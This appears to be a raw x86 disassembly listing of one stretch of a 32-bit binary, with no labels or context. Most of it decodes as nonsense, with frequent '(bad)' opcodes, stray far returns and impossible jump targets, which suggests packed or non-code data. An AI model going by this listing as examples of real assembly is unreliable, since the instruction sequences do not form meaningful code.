  4305be:	pushf  
  4305bf:	lea    ecx,[ecx+0x4d72d808]
  4305c5:	add    BYTE PTR [ebx],dh
  4305c7:	inc    ebp
  4305c8:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  4305ce:	xor    dl,BYTE PTR [edx]
  4305d0:	add    eax,DWORD PTR [ebp-0x77]
  4305d3:	mov    eax,esp
  4305d5:	fmul   QWORD PTR [ebp-0x3d]
  4305d8:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  4305df:	mov    DWORD PTR [ebp-0x24],eax
  4305e2:	rol    DWORD PTR [ebp-0x64],1
  4305e5:	xor    eax,edi
  4305e7:	mov    ecx,0xff858db0
  4305ec:	clc    
  4305ed:	enter  0x4d45,0x3c
  4305f1:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  4305f8:	test   esi,edi
  4305fa:	clc    
  4305fb:	inc    DWORD PTR [ebp+0x45]
  4305fe:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430606:	test   DWORD PTR [ecx],esi
  430608:	clc    
  430609:	pushf  
  43060a:	inc    ebp
  43060b:	(bad)  
  43060c:	cmp    ah,bh
  43060e:	pushf  
  43060f:	inc    ebp
  430610:	mov    edx,DWORD PTR [eax-0x24]
  430613:	add    BYTE PTR [ebp+0x0],dl
  430616:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43061c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  430620:	add    al,dl
  430622:	jmp    0x10407f2
  430627:	jb     0x430676
  430629:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  43062f:	xor    ecx,DWORD PTR [ebp+0x3b]
  430632:	xor    ecx,DWORD PTR [edi]
  430634:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  430638:	(bad)  
  43063a:	clc    
  43063b:	int3   
  43063c:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  430643:	push   cs
  430644:	xor    ecx,eax
  430646:	xor    esp,ecx
  430648:	add    ebp,DWORD PTR [eax]
  43064a:	add    esi,DWORD PTR [eax]
  43064c:	(bad)  
  43064e:	retf   0x55cc
  430651:	repnz mov eax,DWORD PTR [ebp-0x10]
  430655:	(bad)  
  430656:	cli    
  430657:	fdiv   st(1),st
  430659:	test   DWORD PTR [eax+edi*8],ecx
  43065c:	dec    ebp
  43065d:	inc    ebp
  43065e:	xor    edi,DWORD PTR [eax-0x7167afd]
  430664:	add    BYTE PTR [ebp+0x0],al
  430667:	mov    ecx,DWORD PTR [ebp-0x24]
  43066a:	mov    ecx,ebx
  43066c:	clc    
  43066d:	jne    0x43063a
  43066f:	mov    esi,0xd672d3
  430674:	into   
  430675:	into   
  430676:	scas   eax,DWORD PTR es:[edi]
  430677:	dec    ebp
  430678:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  43067e:	sub    ecx,esi
  430680:	cmp    ecx,DWORD PTR [ebp+0x77]
  430683:	(bad)  
  430684:	mov    edi,eax
  430686:	mov    al,0x85
  430688:	mov    eax,edi
  43068a:	add    BYTE PTR [ebp-0x75],al
  43068d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430694:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43069a:	(bad)  
  43069c:	retf   0x559c
  43069f:	(bad)  
  4306a0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4306a7:	inc    ebp
  4306a8:	add    eax,0xeb9c4d3f
  4306ad:	(bad)  
  4306ae:	mov    ecx,eax
  4306b0:	lods   al,BYTE PTR ds:[esi]
  4306b1:	test   DWORD PTR [ebp-0x8],edx
  4306b4:	xor    ecx,DWORD PTR [ebp+0x33]
  4306b7:	mov    eax,DWORD PTR [ebx]
  4306b9:	lock add ecx,ebx
  4306bc:	bswap  esi
  4306be:	retf   0x55d1
  4306c1:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  4306c7:	jmp    0x4306c2
  4306c9:	add    BYTE PTR ds:0xebc44d8b,al
  4306cf:	push   ebp
  4306d0:	mov    ebp,DWORD PTR [ebx]
  4306d2:	test   al,0x8b
  4306d4:	push   ebp
  4306d5:	clc    
  4306d6:	xor    ecx,ebx
  4306d8:	xor    ecx,esi
  4306da:	add    edx,ecx
  4306dc:	add    eax,DWORD PTR [edx+0xca010f]
  4306e2:	push   ebp
  4306e3:	dec    ebp
  4306e4:	mov    ecx,DWORD PTR [ebx-0x34050710]
  4306ea:	stc    
  4306eb:	rol    DWORD PTR ds:0xebce4dd6,cl
  4306f1:	scas   eax,DWORD PTR es:[edi]
  4306f2:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  4306f8:	xor    ebp,DWORD PTR [ebx]
  4306fa:	xor    edi,DWORD PTR [ebx]
  4306fc:	add    esi,DWORD PTR [edi+0x3]
  4306ff:	mov    ecx,DWORD PTR [edi]
  430701:	clc    
  430702:	retf   0x55cb
  430705:	into   
  430706:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43070d:	mov    eax,0x3376554d
  430712:	mov    esi,DWORD PTR [ebx]
  430714:	enter  0x5503,0x3
  430718:	xor    ecx,DWORD PTR [edi]
  43071a:	xor    ecx,edx
  43071c:	add    edx,DWORD PTR [ebp+0x3]
  43071f:	mov    ecx,DWORD PTR [edi]
  430721:	lock retf 0x4dfa
  430725:	stc    
  430726:	mov    ecx,DWORD PTR [eax]
  430728:	or     BYTE PTR [ebp+0x4d],cl
  43072b:	jmp    0x10707bb
  430730:	dec    ebp
  430731:	dec    ebp
  430732:	(bad)  
  430733:	mov    esp,esp
  430735:	clc    
  430736:	test   ebx,ecx
  430738:	clc    
  430739:	ror    DWORD PTR [ebp-0x2a],cl
  43073c:	mov    esi,ecx
  43073e:	in     al,dx
  43073f:	scas   eax,DWORD PTR es:[edi]
  430740:	inc    ebp
  430741:	mov    esi,DWORD PTR [ebx]
  430743:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  43074a:	retf   
  43074b:	ja     0x43071b
  43074d:	mov    ebp,DWORD PTR [eax-0x48]
  430750:	dec    ebp
  430751:	xor    ecx,DWORD PTR [di+0x3]
  430755:	mov    ebp,eax
  430757:	clc    
  430758:	push   ebp
  430759:	retf   
  43075a:	mov    dl,bl
  43075c:	adc    esi,edx
  43075e:	jb     0x43072e
  430760:	add    BYTE PTR [edi-0x3b7474b3],ch
  430766:	in     al,dx
  430767:	jge    0x430734
  430769:	sub    ecx,DWORD PTR [ebp+0x3b]
  43076c:	mov    esi,DWORD PTR [edi-0x24]
  43076f:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  430776:	mov    BYTE PTR [ebx-0x34b20729],cl
  43077c:	mov    edx,ebx
  43077e:	in     al,dx
  43077f:	(bad)  
  430780:	ror    esi,cl
  430782:	push   ebp
  430783:	scas   eax,DWORD PTR es:[edi]
  430784:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43078a:	fwait
  43078b:	sub    esi,DWORD PTR [edx]
  43078d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430793:	lods   al,BYTE PTR ds:[esi]
  430794:	xor    esp,DWORD PTR [ebx]
  430796:	add    ecx,DWORD PTR [ebp-0x18]
  430799:	mov    edi,DWORD PTR [ebp-0x8]
  43079c:	mov    bl,cl
  43079e:	cmp    dl,bl
  4307a0:	jb     0x430770
  4307a2:	add    dh,dl
  4307a4:	dec    ebp
  4307a5:	scas   eax,DWORD PTR es:[edi]
  4307a6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  4307ac:	shr    DWORD PTR [ebx],cl
  4307ae:	into   
  4307af:	cmp    edx,esi
  4307b1:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  4307b7:	dec    ebp
  4307b8:	dec    ebp
  4307b9:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  4307bf:	retf   
  4307c0:	xor    edx,esi
  4307c2:	add    ecx,esi
  4307c4:	imul   ecx,edx
  4307c7:	mov    DWORD PTR [ebp+0x8],edx
  4307ca:	xor    ecx,DWORD PTR [ebp+0x2b]
  4307cd:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  4307d3:	add    esi,DWORD PTR [ebx]
  4307d5:	mov    ah,0x3
  4307d7:	inc    ebp
  4307d8:	rdtsc  
  4307da:	xlat   BYTE PTR ds:[ebx]
  4307db:	pushf  
  4307dc:	jge    0x430767
  4307de:	xor    ebx,esp
  4307e0:	sub    eax,DWORD PTR [ebp-0x73]
  4307e3:	(bad)  
  4307e4:	cmp    al,al
  4307e6:	jb     0x43076d
  4307e8:	add    al,bh
  4307ea:	ror    DWORD PTR [ebp-0x7a],1
  4307ed:	xor    edi,edi
  4307ef:	add    edi,edi
  4307f1:	jmp    0x430840
  4307f3:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  4307f9:	dec    ebp
  4307fa:	into   
  4307fb:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430801:	fwait
  430802:	shl    DWORD PTR [edx],cl
  430804:	retf   0x5588
  430807:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43080d:	add    eax,DWORD PTR [eax]
  43080f:	call   0x8ace5d61
  430814:	fcom   DWORD PTR [ecx]
  430816:	retf   
  430817:	jb     0x43087e
  430819:	add    ch,cl
  43081b:	dec    ebp
  43081c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  430822:	dec    ebp
  430823:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  430829:	jge    0x4307f9
  43082b:	mov    BYTE PTR [edi+0xf723b3a],ch
  430831:	add    cl,dh
  430833:	dec    ebp
  430834:	dec    DWORD PTR [ebx-0x2c031b75]
  43083a:	adc    BYTE PTR [ebp+0x1],0x8b
  43083e:	add    ah,bl
  430840:	jge    0x4307ce
  430842:	push   0xffffff9b
  430844:	push   0x8b3032
  430849:	shl    BYTE PTR [ebp+0x55],0x6a
  43084d:	xor    edi,edi
  43084f:	xor    edx,DWORD PTR [ebx+eax*1]
  430852:	inc    ebp
  430853:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  430859:	dec    ebp
  43085a:	or     BYTE PTR [ecx+0x4dcce883],cl
  430860:	jbe    0x4307ed
  430862:	mov    esp,eax
  430864:	ror    bl,1
  430866:	enter  0x14ce,0xaf
  43086a:	dec    DWORD PTR [ebx-0x2cef13f8]
  430870:	push   ebp
  430871:	retf   0x5540
  430874:	push   ebp
  430875:	mov    esi,DWORD PTR [edx-0x18]
  430878:	mov    edx,ebx
  43087a:	cld    
  43087b:	(bad)  
  43087c:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430883:	sti    
  430884:	add    dh,cl
  430886:	push   0xffffff94
  430888:	call   FWORD PTR [ebx+0x3b5032d0]
  43088e:	mov    ecx,DWORD PTR [edi]
  430890:	enter  0x455e,0xff
  430894:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43089a:	xor    esi,DWORD PTR [ebx]
  43089c:	mov    DWORD PTR [ebx],0xcace0f9c
  4308a2:	aas    
  4308a3:	push   ebp
  4308a4:	inc    ebp
  4308a5:	xor    edx,esi
  4308a7:	add    edx,esi
  4308a9:	mov    eax,DWORD PTR [ebx]
  4308ab:	(bad)  
  4308ac:	jmp    0x43083a
  4308ae:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  4308b4:	rol    ah,1
  4308b6:	mov    esi,0xf133104d
  4308bb:	mov    edx,0xff388d80
  4308c0:	mov    dh,0xd1
  4308c2:	cmp    edx,DWORD PTR [ebp+0xf]
  4308c5:	mov    eax,DWORD PTR [edx-0x28]
  4308c8:	add    BYTE PTR [ebp-0x75],bh
  4308cb:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  4308d2:	fwait
  4308d3:	retf   0x8632
  4308d6:	cmp    ebp,0x8
  4308d9:	call   ebx
  4308db:	inc    ebp
  4308dc:	inc    ebp
  4308dd:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  4308e3:	mov    esi,DWORD PTR [ecx]
  4308e5:	int3   
  4308e6:	pushf  
  4308e7:	add    al,0xc7
  4308e9:	add    al,al
  4308eb:	add    bl,al
  4308ed:	(bad)  
  4308ee:	clc    
  4308ef:	int3   
  4308f0:	inc    ebp
  4308f1:	add    BYTE PTR [ecx],dh
  4308f3:	push   eax
  4308f4:	pushf  
  4308f5:	mov    edi,eax
  4308f7:	enter  0xc008,0x85
  4308fb:	aas    
  4308fc:	clc    
  4308fd:	gs inc ebp
  4308ff:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430905:	push   ss
  430906:	xor    ecx,DWORD PTR [ebp+0x3]
  430909:	sub    edx,DWORD PTR [ecx-0x76]
  43090c:	dec    ebp
  43090d:	add    DWORD PTR [ebx+0x88d845],ecx
  430913:	mov    esi,DWORD PTR [ebx]
  430915:	or     BYTE PTR [ebx],al
  430917:	cmp    edx,DWORD PTR [ecx-0x34]
  43091a:	dec    ebp
  43091b:	out    dx,eax
  43091c:	xor    eax,DWORD PTR [ebp+0x3]
  43091f:	mov    edx,DWORD PTR [ecx-0x28]
  430922:	dec    ebp
  430923:	add    BYTE PTR [ebx],dh
  430925:	push   0x518003
  43092a:	push   eax
  43092b:	add    BYTE PTR [ebx-0x300748b],cl
  430931:	sbb    BYTE PTR [ebp+0x45],cl
  430934:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  43093a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  430940:	dec    ebp
  430941:	inc    ebp
  430942:	xor    edx,esi
  430944:	add    edx,esi
  430946:	push   ecx
  430947:	(bad)  
  430948:	dec    ebp
  430949:	mov    al,ds:0xc5d83dff
  43094e:	retf   
  43094f:	(bad)  
  430950:	into   
  430951:	sub    bh,bh
  430953:	dec    esp
  430954:	adc    al,0x9c
  430956:	inc    ebp
  430957:	push   ebp
  430958:	test   DWORD PTR [edi],ecx
  43095a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  430961:	jmp    0xc9bc1875
  430966:	add    cl,dl
  430968:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  430972:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  430978:	rol    BYTE PTR [eax],0x54
  43097b:	clc    
  43097c:	gs jb  0x430986
  43097f:	mov    eax,DWORD PTR [ebp-0x30]
  430982:	xor    al,0x40
  430984:	sub    al,0xc7
  430986:	mov    al,ah
  430988:	add    DWORD PTR [ebp+0x4534f845],eax
  43098e:	sub    al,0x80
  430990:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430997:	mov    ch,0xff
  430999:	clc    
  43099a:	add    DWORD PTR [ebp+0x60],0x3d
  43099e:	call   FWORD PTR [eax+eax*1-0x277a77]
  4309a5:	inc    ebp
  4309a6:	dec    DWORD PTR [ebx-0x3427f701]
  4309ac:	test   esi,ecx
  4309ae:	dec    DWORD PTR [ebx-0x7f8a3701]
  4309b4:	push   eax
  4309b5:	add    DWORD PTR [ebp+0x0],eax
  4309b8:	dec    ebx
  4309ba:	or     al,0xce
  4309bc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  4309c3:	into   
  4309c4:	add    BYTE PTR [ebx-0x34ff2000],cl
  4309ca:	mov    esi,ecx
  4309cc:	sar    bh,0x45
  4309cf:	adc    al,0x8b
  4309d1:	clc    
  4309d2:	fadd   DWORD PTR [ebp+0x0]
  4309d5:	mov    ebp,DWORD PTR [edx+0x8]
  4309d8:	push   edi
  4309d9:	adc    BYTE PTR [eax+0x1],0x83
  4309dd:	add    al,al
  4309df:	retf   
  4309e0:	mov    ecx,esi
  4309e2:	cld    
  4309e3:	mov    eax,DWORD PTR [eax+0xcb01c8]
  4309e9:	into   
  4309ea:	add    BYTE PTR [ebx+0x756ae000],cl
  4309f0:	jne    0x430a25
  4309f2:	inc    DWORD PTR [ebx]
  4309f4:	rcl    BYTE PTR [ecx+0x50],1
  4309f7:	push   eax
  4309f8:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  4309fe:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430a05:	sar    bh,0x84
  430a08:	or     BYTE PTR [ebx],al
  430a0a:	push   eax
  430a0b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430a11:	pushf  
  430a12:	xor    edi,eax
  430a14:	pushf  
  430a15:	mov    ah,0x89
  430a17:	test   esp,ebp
  430a19:	clc    
  430a1a:	inc    ebp
  430a1b:	inc    ebp
  430a1c:	mov    DWORD PTR [eax+eax*8],esi
  430a1f:	sub    al,0x32
  430a21:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  430a28:	dec    ebp
  430a29:	xor    eax,DWORD PTR gs:[edi+0x3]
  430a2d:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  430a33:	xor    eax,DWORD PTR gs:[edi+0x3]
  430a37:	or     DWORD PTR [ecx+0x45ff085c],0x0
  430a3e:	shl    DWORD PTR [ebp-0x380064],1
  430a44:	enter  0x858d,0x60
  430a48:	clc    
  430a49:	inc    DWORD PTR [ebp+0x50]
  430a4c:	cmp    al,0x75
  430a4e:	pushf  
  430a4f:	(bad)  
  430a50:	(bad)  
  430a51:	pop    esp
  430a52:	lods   al,BYTE PTR ds:[esi]
  430a53:	inc    DWORD PTR [ebp+0x4508f8ff]
  430a59:	mov    edi,DWORD PTR [esi]
  430a5b:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  430a62:	test   DWORD PTR [edi-0x8],edx
  430a65:	sbb    al,0x45
  430a67:	add    BYTE PTR [eax],bh
  430a69:	push   0x8b809c
  430a6e:	loopne 0x430ab5
  430a70:	push   ebp
  430a71:	mov    esi,DWORD PTR [ebx]
  430a73:	cld    
  430a74:	add    eax,DWORD PTR [eax+0xf013b]
  430a7a:	adc    al,0x0
  430a7c:	add    bh,bh
  430a7e:	jmp    0xc00b9b
  430a83:	add    BYTE PTR [ebp+0x45],cl
  430a86:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  430a8c:	dec    ebp
  430a8d:	push   0x38033
  430a92:	cmp    eax,DWORD PTR [eax]
  430a94:	unpcklps xmm7,xmm0
  430a97:	jne    0x430a99
  430a99:	dec    DWORD PTR [ebx+0x5545c818]
  430a9f:	mov    DWORD PTR [ebx],esi
  430aa1:	shl    BYTE PTR [ebx],1
  430aa3:	inc    ebp
  430aa4:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  430aaa:	retf   0x5575
  430aad:	dec    DWORD PTR [ebx-0x5ba13e8]
  430ab3:	(bad)  
  430ab4:	stc    
  430ab5:	loopne 0x430ac3
  430ab7:	test   DWORD PTR [ebp-0x8],ecx
  430aba:	xor    eax,DWORD PTR [ebp+0x3]
  430abd:	mov    ebp,ecx
  430abf:	rol    BYTE PTR [eax],1
  430ac1:	inc    ebp
  430ac2:	add    BYTE PTR [eax-0x7747ab3],bh
  430ac8:	clc    
  430ac9:	inc    ebp
  430aca:	retf   
  430acb:	mov    edx,ebx
  430acd:	loopne 0x430aa5
  430acf:	retf   
  430ad0:	into   
  430ad1:	into   
  430ad2:	scas   eax,DWORD PTR es:[edi]
  430ad3:	dec    ebp
  430ad4:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  430ada:	sub    ecx,esi
  430adc:	cmp    ecx,DWORD PTR [ebp+0x77]
  430adf:	(bad)  
  430ae0:	mov    edi,eax
  430ae2:	enter  0x8985,0xf8
  430ae6:	add    BYTE PTR [ebp-0x75],al
  430ae9:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430af0:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430af6:	(bad)  
  430af8:	retf   0x559c
  430afb:	(bad)  
  430afc:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430b03:	inc    ebp
  430b04:	add    eax,0xeb9c4d3f
  430b09:	(bad)  
  430b0a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430b10:	xor    ecx,DWORD PTR [ebp+0x33]
  430b13:	mov    eax,DWORD PTR [ebx]
  430b15:	in     al,dx
  430b16:	add    ecx,ebx
  430b18:	bswap  esi
  430b1a:	retf   0x55d1
  430b1d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430b23:	jmp    0x430b1e
  430b25:	add    BYTE PTR ds:0xebf44d8b,al
  430b2b:	push   ebp
  430b2c:	mov    ebp,DWORD PTR [ebx]
  430b2e:	mov    eax,0x33f8558b
  430b33:	retf   
  430b34:	xor    ecx,esi
  430b36:	add    edx,ecx
  430b38:	add    eax,DWORD PTR [edx+0xca010f]
  430b3e:	push   ebp
  430b3f:	dec    ebp
  430b40:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430b46:	stc    
  430b47:	rol    DWORD PTR ds:0xebce4dd6,cl
  430b4d:	scas   eax,DWORD PTR es:[edi]
  430b4e:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430b54:	xor    ebp,DWORD PTR [ebx]
  430b56:	xor    edi,DWORD PTR [ebx]
  430b58:	add    esi,DWORD PTR [edi+0x3]
  430b5b:	mov    ecx,DWORD PTR [edi]
  430b5d:	clc    
  430b5e:	retf   0x55cb
  430b61:	into   
  430b62:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430b69:	test   al,0x4d
  430b6b:	push   ebp
  430b6c:	jbe    0x430ba1
  430b6e:	mov    esi,DWORD PTR [ebx]
  430b70:	mov    al,0x3
  430b72:	push   ebp
  430b73:	add    esi,DWORD PTR [ebx]
  430b75:	rdpmc  
  430b77:	retf   0x5503
  430b7a:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430b80:	dec    ebp
  430b81:	stc    
  430b82:	mov    ecx,DWORD PTR [eax]
  430b84:	or     BYTE PTR [ebp+0x4d],cl
  430b87:	jmp    0x1370c17
  430b8c:	dec    ebp
  430b8d:	dec    ebp
  430b8e:	(bad)  
  430b8f:	mov    esp,esp
  430b91:	clc    
  430b92:	test   ebx,ecx
  430b94:	clc    
  430b95:	ror    DWORD PTR [ebp-0x2a],cl
  430b98:	mov    esi,ecx
  430b9a:	lock scas eax,DWORD PTR es:[edi]
  430b9c:	inc    ebp
  430b9d:	mov    esi,DWORD PTR [ebx]
  430b9f:	hlt    
  430ba0:	pushf  
  430ba1:	jge    0x430b2e
  430ba3:	sub    esp,esp
  430ba5:	cmp    ecx,ebx
  430ba7:	ja     0x430b77
  430ba9:	mov    ebp,DWORD PTR [eax-0x58]
  430bac:	dec    ebp
  430bad:	xor    ecx,DWORD PTR [di+0x3]
  430bb1:	mov    ebp,eax
  430bb3:	clc    
  430bb4:	push   ebp
  430bb5:	retf   
  430bb6:	mov    dl,bl
  430bb8:	adc    esi,edx
  430bba:	jb     0x430b8a
  430bbc:	add    BYTE PTR [edi-0xb7474b3],ch
  430bc2:	lock jge 0x430b90
  430bc5:	sub    ecx,DWORD PTR [ebp+0x3b]
  430bc8:	mov    esi,DWORD PTR [edi-0x28]
  430bcb:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430bd2:	mov    BYTE PTR [ebx-0x34b20729],cl
  430bd8:	mov    edx,ebx
  430bda:	lock (bad) 
  430bdc:	ror    esi,cl
  430bde:	push   ebp
  430bdf:	scas   eax,DWORD PTR es:[edi]
  430be0:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430be6:	fwait
  430be7:	sub    esi,DWORD PTR [edx]
  430be9:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430bf0:	xor    esp,DWORD PTR [ebx]
  430bf2:	add    ecx,DWORD PTR [ebp-0x18]
  430bf5:	mov    edi,DWORD PTR [ebp-0x8]
  430bf8:	mov    bl,cl
  430bfa:	cmp    dl,bl
  430bfc:	jb     0x430bcc
  430bfe:	add    dh,dl
  430c00:	dec    ebp
  430c01:	scas   eax,DWORD PTR es:[edi]
  430c02:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430c08:	shr    DWORD PTR [ebx],cl
  430c0a:	into   
  430c0b:	cmp    edx,esi
  430c0d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430c13:	dec    ebp
  430c14:	dec    ebp
  430c15:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430c1b:	retf   
  430c1c:	xor    edx,esi
  430c1e:	add    ecx,esi
  430c20:	imul   ecx,edx
  430c23:	mov    DWORD PTR [ebp+0x8],edx
  430c26:	xor    ecx,DWORD PTR [ebp+0x2b]
  430c29:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430c2f:	add    esi,DWORD PTR [ebx]
  430c31:	rol    BYTE PTR [ebx],0x45
  430c34:	rdtsc  
  430c36:	xlat   BYTE PTR ds:[ebx]
  430c37:	pushf  
  430c38:	jge    0x430bc3
  430c3a:	xor    ebx,eax
  430c3c:	sub    eax,DWORD PTR [ebp-0x73]
  430c3f:	(bad)  
  430c40:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430c47:	dec    ebp
  430c48:	xchg   BYTE PTR [ebx],dh
  430c4a:	inc    DWORD PTR [ebx]
  430c4c:	(bad)  
  430c4d:	jmp    0x430c9c
  430c4f:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430c55:	dec    ebp
  430c56:	into   
  430c57:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430c5d:	fwait
  430c5e:	shl    DWORD PTR [edx],cl
  430c60:	retf   0x5588
  430c63:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430c69:	add    eax,DWORD PTR [eax]
  430c6b:	call   0x8ace61bd
  430c70:	fcom   QWORD PTR [ecx]
  430c72:	retf   
  430c73:	jb     0x430cda
  430c75:	add    ch,cl
  430c77:	dec    ebp
  430c78:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430c7e:	dec    ebp
  430c7f:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430c85:	jge    0x430c55
  430c87:	mov    BYTE PTR [edi+0xf723b3a],ch
  430c8d:	add    cl,dh
  430c8f:	dec    ebp
  430c90:	dec    DWORD PTR [ebx-0x2c031b01]
  430c96:	inc    ebp
  430c97:	push   ebp
  430c98:	dec    DWORD PTR [ebx-0x73ff2734]
  430c9e:	lea    ebx,[ebx-0x7400cdac]
  430ca4:	push   eax
  430ca5:	mov    ah,0x45
  430ca7:	push   ebp
  430ca8:	mov    esi,DWORD PTR [ebx]
  430caa:	les    esi,FWORD PTR [ebx]
  430cac:	add    BYTE PTR [ebx],al
  430cae:	inc    DWORD PTR [ebx]
  430cb0:	mov    ecx,DWORD PTR [edi]
  430cb2:	cld    
  430cb3:	retf   0x4d80
  430cb6:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430cbc:	jne    0x430c49
  430cbe:	jmp    eax
  430cc0:	ror    bl,1
  430cc2:	or     cl,dh
  430cc4:	add    BYTE PTR [edi-0xf2f7475],ch
  430cca:	not    bl
  430ccc:	adc    al,0xca
  430cce:	inc    ebp
  430ccf:	push   ebp
  430cd0:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430cd6:	push   0xaf80d6
  430cdb:	mov    eax,DWORD PTR [eax]
  430cdd:	in     al,0xff
  430cdf:	sti    
  430ce0:	sbb    dh,cl
  430ce2:	pop    esi
  430ce3:	xchg   esp,eax
  430ce4:	leave  
  430ce5:	fwait
  430ce6:	add    al,0x32
  430ce8:	push   ebp
  430ce9:	cmp    ebp,esp
  430ceb:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430cef:	dec    DWORD PTR [ecx-0x740f0375]
  430cf5:	push   ebp
  430cf6:	cld    
  430cf7:	xor    ebp,ebx
  430cf9:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430cff:	push   ebp
  430d00:	clc    
  430d01:	xor    esi,ecx
  430d03:	add    esi,DWORD PTR [ebp-0x75]
  430d06:	(bad)  
  430d07:	hlt    
  430d08:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430d0f:	mov    DWORD PTR [esi],eax
  430d11:	hlt    
  430d12:	(bad)  
  430d13:	dec    ebp
  430d14:	add    esi,DWORD PTR [ebx]
  430d16:	(bad)  
  430d17:	mov    edx,0xffc68d0a
  430d1c:	add    dl,cl
  430d1e:	leave  
  430d1f:	push   ebp
  430d20:	push   ebp
  430d21:	mov    ebp,esp
  430d23:	fcom   QWORD PTR [ecx+0x7d]
  430d26:	inc    ebp
  430d27:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430d2d:	iret   
  430d2e:	cld    
  430d2f:	retf   0x868f
  430d32:	loopne 0x430d31
  430d34:	mov    edi,edi
  430d36:	mov    esi,DWORD PTR [ebp-0x8]
  430d39:	mov    esi,eax
  430d3b:	cld    
  430d3c:	jne    0x430cee
  430d3e:	mov    BYTE PTR [ecx],0xa
  430d41:	add    dh,al
  430d43:	test   DWORD PTR [eax],ecx
  430d45:	inc    esi
  430d47:	inc    DWORD PTR [edi]
  430d49:	mov    eax,esi
  430d4b:	cld    
  430d4c:	add    DWORD PTR [eax+0x901c6],eax
  430d52:	leave  
  430d53:	xor    BYTE PTR [ebp+0x45],dl
  430d56:	in     al,dx
  430d57:	mov    edx,DWORD PTR [ecx-0x40]
  430d5a:	inc    ebp
  430d5b:	add    BYTE PTR [ecx-0x74000301],cl
  430d61:	int3   
  430d62:	cld    
  430d63:	jne    0x430d1d
  430d65:	call   0xcc2070
  430d6a:	mov    esi,DWORD PTR [ebp-0x8]
  430d6d:	test   eax,esi
  430d6f:	je     0x430de6
  430d71:	mov    eax,esi
  430d73:	cld    
  430d74:	add    al,0x80
  430d76:	add    WORD PTR [ecx+0x0],ax
  430d7a:	fiadd  DWORD PTR [eax]
  430d7c:	mov    BYTE PTR [eax],0x3d
  430d7f:	push   0xffffffc3
  430d81:	push   esi
